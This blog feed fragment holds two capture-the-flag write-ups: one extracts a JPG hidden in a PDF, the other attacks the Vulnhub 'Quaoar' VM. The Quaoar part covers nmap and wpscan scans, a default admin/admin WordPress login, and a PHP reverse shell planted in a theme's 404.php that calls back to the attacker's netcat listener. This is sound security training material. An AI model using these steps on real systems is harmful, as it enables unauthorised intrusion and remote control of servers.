┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅

We've received PDF document, where apparently there's a hidden message.
Would you help us find it?

  https://goo.gl/wgt94W

Good luck!
&lt;/pre&gt;

&lt;p&gt;I started this challenge by looking at the file with a hex editor. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/gynvael-missions/pdf_hex_editor.png&quot; alt=&quot;Hexdump&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After a few moments of searching, I've found the &lt;b&gt;JFIF&lt;/b&gt; segment and so, the whole structure of &lt;b&gt;JPG&lt;/b&gt; file. From that moment, I think we'll be able to extract it from the PDF and somehow recreate it. &lt;/p&gt;

&lt;p&gt;Quick peek at &lt;a href=&quot;https://en.wikipedia.org/wiki/JPEG_File_Interchange_Format&quot;&gt;Wikipedia&lt;/a&gt; showed that whole JPG file is placed between &lt;code&gt;FF DA&lt;/code&gt; and &lt;code&gt;FF D9&lt;/code&gt; codes. &lt;/p&gt;

&lt;table&gt;&lt;tr&gt;
&lt;th colspan=&quot;3&quot; style=&quot;text-align:left&quot;&gt;JFIF file structure&lt;/th&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:left&quot;&gt;Segment&lt;/th&gt;
&lt;th style=&quot;text-align:left&quot;&gt;Code&lt;/th&gt;
&lt;th style=&quot;text-align:left&quot;&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SOI&lt;/td&gt;
&lt;td&gt;&lt;code&gt;FF D8&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Start of Image&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;JFIF-APP0&lt;/td&gt;
&lt;td&gt;&lt;code&gt;FF E0 &lt;i&gt;s1&lt;/i&gt; &lt;i&gt;s2&lt;/i&gt; 4A 46 49 46 00 ...&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;see below&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;JFXX-APP0&lt;/td&gt;
&lt;td&gt;&lt;code&gt;FF E0 &lt;i&gt;s1&lt;/i&gt; &lt;i&gt;s2&lt;/i&gt; 4A 46 58 58 00 ...&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;optional, see below&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td colspan=&quot;3&quot;&gt;… additional marker segments&lt;br /&gt;
(for example SOF, DHT, COM)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SOS&lt;/td&gt;
&lt;td&gt;&lt;code&gt;FF DA&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Start of Scan&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;compressed image data&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;EOI&lt;/td&gt;
&lt;td&gt;&lt;code&gt;FF D9&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;End of Image&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;

&lt;p&gt;Now let's copy everything between these segments and add to a new file. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/gynvael-missions/hex_image.png&quot; alt=&quot;hex image&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Last step is to save this file as JPG image. By the way, here's the flag ;)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/gynvael-missions/pdf_flag.jpg&quot; alt=&quot;flag&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Sun, 10 Sep 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/gynveal-mission-10-polish/</link>
        <guid isPermaLink="true">http://localhost:4000/gynveal-mission-10-polish/</guid>
      </item>
    
      <item>
        <title>Vulnhub.com - Quaoar</title>
        <description>&lt;p&gt;Hello everyone, another week, another challenge from &lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;&lt;b&gt;Vulnhub&lt;/b&gt;&lt;/a&gt;. This time we're going to work on a short machine called &lt;b&gt;Quaoar&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Welcome to Quaoar

This is a vulnerable machine i created for the Hackfest 2016 CTF http://hackfest.ca/

Difficulty : Very Easy

Tips:

Here are the tools you can research to help you to own this machine. nmap dirb / dirbuster / BurpSmartBuster nikto wpscan hydra Your Brain Coffee Google :)

Goals: This machine is intended to be doable by someone who is interested in learning computer security There are 3 flags on this machine 1. Get a shell 2. Get root access 3. There is a post exploitation flag on the box

Feedback: This is my first vulnerable machine, please give me feedback on how to improve ! @ViperBlackSkull on Twitter simon.nolet@hotmail.com Special Thanks to madmantm for testing

SHA-256 DA39EC5E9A82B33BA2C0CD2B1F5E8831E75759C51B3A136D3CB5D8126E2A4753

You may have issues with VMware&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Author: &lt;a href=&quot;https://www.vulnhub.com/author/viper,475/&quot;&gt;&lt;b&gt;Viper&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Download: &lt;a href=&quot;https://www.vulnhub.com/entry/hackfest2016-quaoar,180/&quot;&gt;&lt;b&gt;Quaoar&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;Write-Up&lt;/h1&gt;

&lt;p&gt;Attacker: &lt;b&gt;Kali Linux 192.168.56.103&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;Victim: &lt;b&gt;Quaoar 192.168.56.102&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;Let's start by firstly scanning the machine with &lt;b&gt;nmap&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; 192.168.56.102

Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-08-19 08:24 EDT
NSE: Loaded 132 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:24
Completed NSE at 08:24, 0.00s elapsed
Initiating NSE at 08:24
Completed NSE at 08:24, 0.00s elapsed
Initiating ARP Ping Scan at 08:24
Scanning 192.168.56.102 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
Completed ARP Ping Scan at 08:24, 0.22s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
Initiating SYN Stealth Scan at 08:24
Scanning 192.168.56.102 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1000 ports]
Discovered open port 80/tcp on 192.168.56.102
Discovered open port 995/tcp on 192.168.56.102
Discovered open port 110/tcp on 192.168.56.102
Discovered open port 22/tcp on 192.168.56.102
Discovered open port 993/tcp on 192.168.56.102
Discovered open port 53/tcp on 192.168.56.102
Discovered open port 139/tcp on 192.168.56.102
Discovered open port 445/tcp on 192.168.56.102
Discovered open port 143/tcp on 192.168.56.102
Completed SYN Stealth Scan at 08:24, 1.43s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1000 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating Service scan at 08:24
Scanning 9 services on 192.168.56.102
Completed Service scan at 08:24, 11.02s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9 services on 1 host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating OS detection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;try &lt;span class=&quot;c&quot;&gt;#1) against 192.168.56.102&lt;/span&gt;
adjust_timeouts2: packet supposedly had rtt of &lt;span class=&quot;nt&quot;&gt;-176545&lt;/span&gt; microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of &lt;span class=&quot;nt&quot;&gt;-176545&lt;/span&gt; microseconds.  Ignoring time.
NSE: Script scanning 192.168.56.102.
Initiating NSE at 08:24
Completed NSE at 08:24, 9.19s elapsed
Initiating NSE at 08:24
Completed NSE at 08:24, 0.00s elapsed
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.102
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00082s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 991 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
53/tcp  open  domain      ISC BIND 9.8.1-P1
| dns-nsid:
|_  bind.version: 9.8.1-P1
80/tcp  open  http        Apache httpd 2.2.22 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
| http-robots.txt: 1 disallowed entry
|_Hackers
|_http-server-header: Apache/2.2.22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html).
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: RESP-CODES STLS PIPELINING SASL TOP UIDL CAPA
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-08-19T14:24:32+00:00; +2h00m00s from scanner time.
139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: IDLE SASL-IR ENABLE more STARTTLS ID have capabilities LOGIN-REFERRALS post-login LOGINDISABLEDA0001 listed LITERAL+ OK IMAP4rev1 Pre-login
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-08-19T14:24:31+00:00; +2h00m00s from scanner time.
445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
993/tcp open  ssl/imap    Dovecot imapd
|_imap-capabilities: IDLE SASL-IR AUTH=PLAINA0001 more ID have capabilities LOGIN-REFERRALS post-login listed LITERAL+ OK IMAP4rev1 ENABLE Pre-login
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-08-19T14:24:31+00:00; +1h59m59s from scanner time.
995/tcp open  ssl/pop3    Dovecot pop3d
|_pop3-capabilities: RESP-CODES PIPELINING USER SASL(PLAIN) TOP UIDL CAPA
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-08-19T14:24:31+00:00; +1h59m59s from scanner time.
MAC Address: 08:00:27:BB:CE:22 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Uptime guess: 198.049 days (since Thu Feb  2 06:14:13 2017)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: QUAOAR, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
| Names:
|   QUAOAR&amp;lt;00&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|   QUAOAR&amp;lt;03&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|   QUAOAR&amp;lt;20&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|   \x01\x02__MSBROWSE__\x02&amp;lt;01&amp;gt;  Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
|   WORKGROUP&amp;lt;1d&amp;gt;        Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|   WORKGROUP&amp;lt;1e&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
|_  WORKGROUP&amp;lt;00&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
| smb-os-discovery:
|   OS: Unix (Samba 3.6.3)
|   NetBIOS computer name:
|   Workgroup: WORKGROUP
|_  System time: 2017-08-19T10:24:30-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server doesn'&lt;/span&gt;t support SMBv2 protocol

TRACEROUTE
HOP RTT     ADDRESS
1   0.82 ms 192.168.56.102

NSE: Script Post-scanning.
Initiating NSE at 08:24
Completed NSE at 08:24, 0.00s elapsed
Initiating NSE at 08:24
Completed NSE at 08:24, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;25.33 seconds
           Raw packets sent: 1127 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;51.988KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 1122 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;47.336KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Wow, that's a lot of open ports. I decided to begin from looking at the &lt;b&gt;port 80&lt;/b&gt;. In addition &lt;b&gt;nmap&lt;/b&gt; scan showed disallowed entry, which we have to check out. &lt;/p&gt;

&lt;p&gt;Main directory of the web pages showes only two images. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/quaoar/htp1.png&quot; alt=&quot;Hack_The_Planet_1&quot; class=&quot;img-responsive center-block&quot; /&gt;
&lt;br /&gt;
&lt;img src=&quot;/img/quaoar/htp2.png&quot; alt=&quot;Hack_The_Planet_2&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now let's take a look at &lt;b&gt;robots.txt&lt;/b&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Disallow: Hackers
Allow: /wordpress/
   ____                              
&lt;span class=&quot;c&quot;&gt;#  /___ \_   _  __ _  ___   __ _ _ __&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# //  / / | | |/ _` |/ _ \ / _` | '__|&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#/ \_/ /| |_| | (_| | (_) | (_| | |   &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#\___,_\ \__,_|\__,_|\___/ \__,_|_|   &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Wordpress directory? Seems interesting. By looking at the source code, we know that it's an old version of this CMS. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;generator&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;WordPress 3.9.14&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let's run a &lt;b&gt;wpscan&lt;/b&gt;, while in meantime I decided to look for common usernames on the &lt;b&gt;wp-login&lt;/b&gt; page. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# wpscan &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; http://192.168.56.102/wordpress
_______________________________________________________________
        __          _______   _____                  
        &lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt;       / /  __ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ ____|                 
         &lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt; /&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; / /| |__&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;___   ___  __ _ _ __  
          &lt;span class=&quot;se&quot;&gt;\ \/&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; / |  ___/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ __|/ _ | _ &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
           &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; /&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; /  | |     ____&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;__| &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_| | | | |
            &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;   |_|    |_____/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] URL: http://192.168.56.102/wordpress/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Started: Sat Aug 19 08:30:02 2017

&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; The WordPress &lt;span class=&quot;s1&quot;&gt;'http://192.168.56.102/wordpress/readme.html'&lt;/span&gt; file exists exposing a version number
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Interesting header: SERVER: Apache/2.2.22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Interesting header: X-POWERED-BY: PHP/5.3.10-1ubuntu3
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] XML-RPC Interface available under: http://192.168.56.102/wordpress/xmlrpc.php
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Upload directory has directory listing enabled: http://192.168.56.102/wordpress/wp-content/uploads/

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WordPress version 3.9.14 identified from meta generator

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WordPress theme &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;use: twentyfourteen - v1.1

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Name: twentyfourteen - v1.1
 |  Location: http://192.168.56.102/wordpress/wp-content/themes/twentyfourteen/
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; The version is out of date, the latest version is 1.6
 |  Style URL: http://192.168.56.102/wordpress/wp-content/themes/twentyfourteen/style.css
 |  Referenced style.css: wp-content/themes/twentyfourteen/style.css
 |  Theme Name: Twenty Fourteen
 |  Theme URI: http://wordpress.org/themes/twentyfourteen
 |  Description: In 2014, our default theme lets you create a responsive magazine website with a sleek, modern des...
 |  Author: the WordPress team
 |  Author URI: http://wordpress.org/

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Enumerating plugins from passive detection ...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] No plugins found

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Finished: Sat Aug 19 08:30:05 2017
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Requests Done: 41
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Memory used: 8.387 MB
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Elapsed &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 00:00:03&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But wait, there's an &lt;b&gt;admin&lt;/b&gt; account? &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/quaoar/wp-admin.png&quot; alt=&quot;Admin login&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And there's even more, password of this account is simply &lt;b&gt;admin&lt;/b&gt;! Now we're in the administrator panel of Wordpress, from where we can deploy a &lt;a href=&quot;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;PHP Reverse Shell&lt;/a&gt;. &lt;/p&gt;

&lt;p&gt;Reemeber to change the IP address. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$VERSION&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'192.168.56.103'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// CHANGE THIS
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1234&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// CHANGE THIS
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$chunk_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$write_a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$error_a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$shell&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'uname -a; w; id; /bin/sh -i'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$daemon&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$debug&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;To put it in the site, I decided to modify the code of &lt;b&gt;404.php&lt;/b&gt; page from the theme. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/quaoar/wp-shell.png&quot; alt=&quot;Shell&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then, we only have to set up the listener and navigate to the url of the page. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;192.168.56.102/wordpress/wp-content/themes/twentyfourteen/404.php&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 1234
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1234 ...
192.168.56.102: inverse host lookup failed: Unknown host
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.103] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.102] 51795
Linux Quaoar 3.2.0-23-generic-pae &lt;span class=&quot;c&quot;&gt;#36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 i686 i686 i386 GNU/Linux&lt;/span&gt;
 11:00:33 up 40 min,  0 users,  load average: 0.01, 0.05, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
